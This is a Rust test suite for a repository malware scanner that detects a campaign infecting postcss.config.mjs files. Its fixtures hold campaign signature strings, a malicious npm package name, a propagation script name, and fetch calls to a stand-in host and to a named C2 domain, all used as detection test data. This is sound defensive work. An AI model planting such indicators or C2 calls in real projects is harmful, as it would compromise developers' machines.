        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "export default { plugins: {} };\n").unwrap();
        fs::write(repo.join("package.json"), r#"{"scripts":{"build":"vite build"}}"#).unwrap();
        let files = WorkingTree::new(&repo);
        assert!(scan_capabilities(&repo, &files).is_empty());
    }

    #[test]
    fn flags_infected_config_file() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal['!']='8-270-2';var x='rmcej%otb%';",
        )
        .unwrap();

        let findings = scan_repo(&repo, &[literal_pack()]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].campaign, "polinrider");
        assert_eq!(findings[0].signature_id, "primary");
    }

    #[test]
    fn scan_files_skips_excluded_build_dirs() {
        // A pack signature (here entropy-tail) must not fire on benign minified output in
        // build dirs. scan_files must honor the same is_excluded_path exclusions the
        // capability pass uses, or a dist/index.js bundle produces a Critical false positive.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let dist = repo.join("dist");
        fs::create_dir_all(&dist).unwrap();
        const B64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let blob: String = (0..600).map(|i| B64[(i * 37) % B64.len()] as char).collect();
        fs::write(
            dist.join("index.js"),
            format!("console.log(1)\n//# sourceMappingURL=data:application/json;base64,{blob}"),
        )
        .unwrap();

        let mut pack = literal_pack();
        pack.manifest.target_files = vec!["index.js".into()];
        pack.manifest.content_signatures = vec![ContentSignature {
            id: "entropy-tail".into(),
            kind: SignatureKind::EntropyOver,
            value: "5.0".into(),
        }];
        let files = WorkingTree::new(&repo);
        let findings = scan_files(&repo, &files, &[pack]);
        assert!(
            !findings.iter().any(|f| f.file == Some(PathBuf::from("dist/index.js"))),
            "build-dir bundle must be excluded from the pack pass, matching the capability pass"
        );
    }

    #[test]
    fn binary_file_is_not_content_matched() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // Target-named file, signature present, but contains a NUL byte early.
        let mut bytes = b"\x00".to_vec();
        bytes.extend_from_slice(b"rmcej%otb%");
        std::fs::write(repo.join("postcss.config.mjs"), bytes).unwrap();
        assert!(scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn clean_config_file_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "export default {};\n").unwrap();
        assert!(scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn non_target_file_ignored() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // Signature present, but in a file that is not a target.
        fs::write(repo.join("README.md"), "rmcej%otb%").unwrap();
        assert!(scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn scan_reports_repo_count_across_roots() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        let report = scan(&[tmp.path().to_path_buf()], &[literal_pack()]);
        assert_eq!(report.repos_scanned, 1);
        assert_eq!(report.findings.len(), 1);
    }

    #[test]
    fn scan_streaming_reports_each_repo_and_can_cancel() {
        use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
        use std::sync::Mutex;
        let tmp = TempDir::new().unwrap();
        for name in ["a", "b"] {
            let repo = tmp.path().join(name);
            std::fs::create_dir_all(repo.join(".git")).unwrap();
            std::fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        }
        // Full run: each repo emits a Scanning then a Scanned event. The scan is parallel, so
        // events arrive in completion order — assert the set, not the order.
        let scanned: Mutex<Vec<(usize, usize, usize)>> = Mutex::new(Vec::new()); // (done, total, findings)
        let scanning = AtomicUsize::new(0);
        let cancel = AtomicBool::new(false);
        let report = scan_streaming(
            &[tmp.path().to_path_buf()],
            &[literal_pack()],
            false,
            &cancel,
            &|e| match e.phase {
                ScanPhase::Scanning => {
                    scanning.fetch_add(1, Ordering::Relaxed);
                }
                ScanPhase::Scanned => scanned.lock().unwrap().push((e.done, e.total, e.findings)),
            },
        );
        assert_eq!(report.repos_scanned, 2);
        assert_eq!(scanning.load(Ordering::Relaxed), 2, "one Scanning event per repo");
        let mut got = scanned.into_inner().unwrap();
        got.sort();
        // Each repo has one finding (the literal signature); done runs 1..=2.
        assert_eq!(got, vec![(1, 2, 1), (2, 2, 1)]);

        // A set cancel flag stops the run: every repo is skipped, nothing is scanned.
        let cancel2 = AtomicBool::new(true);
        let calls = AtomicUsize::new(0);
        let report2 = scan_streaming(
            &[tmp.path().to_path_buf()],
            &[literal_pack()],
            false,
            &cancel2,
            &|_e| {
                calls.fetch_add(1, Ordering::Relaxed);
            },
        );
        assert_eq!(report2.repos_scanned, 0, "a cancelled scan does no work");
        assert_eq!(calls.load(Ordering::Relaxed), 0);
    }

    #[test]
    fn analyzer_findings_are_included() {
        struct Stub;
        impl crate::pack::CampaignAnalyzer for Stub {
            fn id(&self) -> &str { "polinrider" }
            fn analyze(&self, file: &ScannedFile) -> Vec<Finding> {
                if file.content.contains("MDy") {
                    vec![Finding {
                        campaign: "polinrider".into(),
                        severity: Severity::Critical,
                        repo: file.repo.clone(),
                        file: Some(file.path.clone()),
                        signature_id: "analyzer".into(),
                        kind: FindingKind::Analyzer,
                        evidence: "stub".into(),
                        remediable: true,
                        online: None,
                        git_ref: None,
                    }]
                } else {
                    vec![]
                }
            }
        }
        let mut pack = literal_pack();
        pack.analyzer = Some(Box::new(Stub));

        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "var MDy = 1; rmcej%otb%").unwrap();

        let findings = scan_repo(&repo, &[pack]);
        // one content-signature finding + one analyzer finding
        assert_eq!(findings.len(), 2);
        assert!(findings.iter().any(|f| f.kind == FindingKind::Analyzer));
    }

    #[test]
    fn flags_artifact_file() {
        let mut pack = literal_pack();
        pack.manifest.artifacts = vec![crate::pack::Artifact {
            path: "temp_auto_push.bat".into(),
            label: "Propagation script".into(),
        }];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("temp_auto_push.bat"), "@echo off").unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::Artifact
            && f.file == Some(PathBuf::from("temp_auto_push.bat"))));
    }

    #[test]
    fn artifact_case_variants_dedupe_to_one_physical_file() {
        // Two artifact paths differing only in case must not yield two findings for a single
        // physical file on a case-insensitive filesystem (macOS/APFS, Windows). On a
        // case-sensitive tree they canonicalize apart, so genuinely separate files are kept.
        let mut pack = literal_pack();
        pack.manifest.artifacts = vec![
            crate::pack::Artifact { path: "wf.yml".into(), label: "lower".into() },
            crate::pack::Artifact { path: "WF.yml".into(), label: "upper".into() },
        ];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("wf.yml"), "on: push\n").unwrap(); // one physical file
        let findings = scan_repo(&repo, &[pack]);
        let artifacts = findings.iter().filter(|f| f.kind == FindingKind::Artifact).count();
        assert_eq!(artifacts, 1, "one physical file must yield exactly one artifact finding");
    }

    #[test]
    fn flags_gitignore_injection() {
        let mut pack = literal_pack();
        pack.manifest.gitignore_injections = vec!["config.bat".into()];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join(".gitignore"), "node_modules\nconfig.bat\n").unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::GitignoreInjection));
    }

    #[test]
    fn content_signature_remediable_tracks_strip_availability() {
        // `remediable` must equal "an auto-remediation action exists" (remediate::action_for).
        // A campaign with content signatures but NO strip strategy (e.g. shai-hulud) must
        // stamp its ContentSignature findings remediable=false — otherwise exit-code and
        // branch-routing logic treat unfixable malware as resolved.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "export default {};\nrmcej%otb%").unwrap();

        // No remediation configured -> not auto-remediable.
        let no_strip = scan_repo(&repo, &[literal_pack()]);
        let cs = no_strip.iter().find(|f| f.kind == FindingKind::ContentSignature).unwrap();
        assert!(!cs.remediable, "no strip strategy -> action_for None -> not remediable");

        // Same pack WITH a strip strategy -> auto-remediable.
        let mut pack = literal_pack();
        pack.manifest.remediation = Some(crate::pack::Remediation {
            config_payload: Some(crate::pack::PayloadStrip {
                strategy: "strip_after_marker".into(),
                markers: vec!["rmcej".into()],
                strip_lines: vec![],            }),
        });
        let with_strip = scan_repo(&repo, &[pack]);
        let cs2 = with_strip.iter().find(|f| f.kind == FindingKind::ContentSignature).unwrap();
        assert!(cs2.remediable, "strip strategy present -> action_for Some -> remediable");
    }

    #[test]
    fn flags_malicious_npm_dependency() {
        let mut pack = literal_pack();
        pack.manifest.bad_npm_packages = vec!["tailwindcss-style-animate".into()];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("package.json"),
            r#"{"dependencies":{"tailwindcss-style-animate":"^1.1.6","react":"18"}}"#,
        )
        .unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::NpmPackage
            && f.evidence.contains("tailwindcss-style-animate")));
    }

    #[test]
    fn reflog_finding_only_when_other_findings_present() {
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "c"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};\nrmcej%otb%").unwrap();
        git(&repo, &["commit", "-q", "-a", "--amend", "-m", "c"]);

        let findings = scan_repo(&repo, &[literal_pack()]);
        // content-signature finding + reflog finding
        assert!(findings.iter().any(|f| f.kind == FindingKind::GitReflog));

        // A repo with an amend but no other findings gets NO reflog finding.
        let tmp2 = TempDir::new().unwrap();
        let clean = tmp2.path().join("proj");
        std::fs::create_dir_all(&clean).unwrap();
        git(&clean, &["init", "-q"]);
        std::fs::write(clean.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&clean, &["add", "."]);
        git(&clean, &["commit", "-q", "-m", "c"]);
        git(&clean, &["commit", "-q", "-a", "--amend", "-m", "c2"]);
        assert!(!scan_repo(&clean, &[literal_pack()]).iter().any(|f| f.kind == FindingKind::GitReflog));
    }

    #[test]
    fn capability_survives_non_remediable_pack_finding_on_same_file() {
        // A Critical capability finding must NOT be suppressed by a weaker, non-remediable
        // pack finding (a Medium IocDomain) on the same file. Dedup only drops the additive
        // generic capability finding when a *remediable* campaign finding already covers it.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let mut pack = literal_pack();
        pack.manifest.ioc_domains = vec!["evil.example".into()];
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal['!']='x';var _$_1e42=[];fetch('https://evil.example/x')",
        )
        .unwrap();
        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::IocDomain));
        assert!(
            findings.iter().any(|f| f.kind == FindingKind::Capability),
            "capability finding must survive alongside a non-remediable IocDomain on the same file"
        );
    }

    #[test]
    fn capability_deduped_by_remediable_pack_finding_on_same_file() {
        // When a *remediable* campaign finding (ContentSignature with a strip strategy)
        // covers the file, the additive generic capability finding IS dropped as a duplicate.
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let mut pack = literal_pack();
        pack.manifest.remediation = Some(crate::pack::Remediation {
            config_payload: Some(crate::pack::PayloadStrip {
                strategy: "strip_after_marker".into(),
                markers: vec!["global['!']=".into()],
                strip_lines: vec![],            }),
        });
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal['!']='x';var _$_1e42=[];fetch('http://x');rmcej%otb%",
        )
        .unwrap();
        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::ContentSignature && f.remediable));
        assert!(
            !findings.iter().any(|f| f.kind == FindingKind::Capability),
            "remediable campaign finding covers the file -> generic capability finding deduped"
        );
    }

    #[test]
    fn detects_config_in_subdirectory() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let nested = repo.join("packages/web");
        fs::create_dir_all(&nested).unwrap();
        fs::write(nested.join("postcss.config.mjs"), "rmcej%otb%").unwrap();

        let findings = scan_repo(&repo, &[literal_pack()]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::ContentSignature
            && f.file == Some(PathBuf::from("packages/web/postcss.config.mjs"))));
    }

    #[test]
    fn flags_ioc_domain_even_without_content_signature() {
        let mut pack = literal_pack();
        pack.manifest.ioc_domains = vec!["default-configuration.vercel.app".into()];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // No content signature present — only the C2 domain reference.
        fs::write(
            repo.join("postcss.config.mjs"),
            "fetch('https://default-configuration.vercel.app/settings/mac')",
        )
        .unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::IocDomain));
        assert!(!findings.iter().any(|f| f.kind == FindingKind::ContentSignature));
    }

    #[test]
    fn deep_scan_finds_payload_on_non_checked_out_branch() {
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "clean"]);
        git(&repo, &["checkout", "-q", "-b", "evil"]);
        std::fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        git(&repo, &["commit", "-q", "-am", "payload"]);
        git(&repo, &["checkout", "-q", "main"]);

        // Working tree (main) is clean.
        assert!(scan_repo(&repo, &[literal_pack()]).is_empty());
        // Deep scan finds the payload on the 'evil' branch tip.
        let deep = deep_scan_repo(&repo, &[literal_pack()]);
        assert!(deep.iter().any(|f| f.kind == FindingKind::ContentSignature
            && f.git_ref.as_deref() == Some("evil")));
    }

    #[test]
    fn deep_scan_skips_files_unchanged_from_head() {
        // Optimization contract: a branch tip is scanned by its DIFF from HEAD. A payload in a file
        // that is IDENTICAL on HEAD is the working-tree pass's responsibility and must NOT be
        // re-reported per-branch. Here `main` (HEAD) carries the payload; `evil` only adds an
        // unrelated clean file, leaving the infected config unchanged — so `evil` yields no finding.
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "payload"]);
        git(&repo, &["checkout", "-q", "-b", "evil"]);
        std::fs::write(repo.join("other.txt"), "clean").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "unrelated"]);
        git(&repo, &["checkout", "-q", "main"]);

        // The infected config is unchanged between HEAD and `evil`; deep scan must not re-report it.
        let deep = deep_scan_repo(&repo, &[literal_pack()]);
        assert!(
            deep.iter().all(|f| f.git_ref.as_deref() != Some("evil")),
            "a payload identical to HEAD must not be re-reported per-branch: {deep:?}"
        );
    }

    #[test]
    fn deep_scan_prunes_committed_node_modules() {
        // A branch tip that commits node_modules/<pkg>/postcss.config.mjs must be pruned the
        // same way the working-tree walk prunes node_modules. GitTree (and ApiTree) must not
        // scan vendored deps that WorkingTree never sees, or deep scan emits phantom findings.
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("readme.md"), "clean").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "clean"]);
        git(&repo, &["checkout", "-q", "-b", "vendored"]);
        let nm = repo.join("node_modules/evil");
        std::fs::create_dir_all(&nm).unwrap();
        std::fs::write(nm.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        git(&repo, &["add", "-f", "."]);
        git(&repo, &["commit", "-q", "-m", "vendored payload"]);
        git(&repo, &["checkout", "-q", "main"]);

        let deep = deep_scan_repo(&repo, &[literal_pack()]);
        assert!(
            !deep.iter().any(|f| f
                .file
                .as_ref()
                .map(|p| p.starts_with("node_modules"))
                .unwrap_or(false)),
            "committed node_modules must be pruned from the deep (GitTree) scan"
        );
    }

    #[test]
    fn deep_scan_clean_repo_with_branches_is_clean() {
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "clean"]);
        git(&repo, &["branch", "feature"]);
        assert!(deep_scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn deep_scan_excludes_head_commit() {
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "p"]);
        // Payload is on the current branch (HEAD); the working-tree pass covers it,
        // so deep_scan_repo must NOT re-report it.
        assert!(deep_scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn deep_scan_dedupes_refs_at_same_commit() {
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "clean"]);
        git(&repo, &["checkout", "-q", "-b", "evil"]);
        std::fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        git(&repo, &["commit", "-q", "-am", "p"]);
        git(&repo, &["branch", "dup", "evil"]); // second ref at the same commit
        git(&repo, &["checkout", "-q", "main"]);

        let deep = deep_scan_repo(&repo, &[literal_pack()]);
        // 'evil' and 'dup' point at the same commit → its tree is scanned once.
        assert_eq!(
            deep.iter().filter(|f| f.kind == FindingKind::ContentSignature).count(),
            1
        );
    }
}
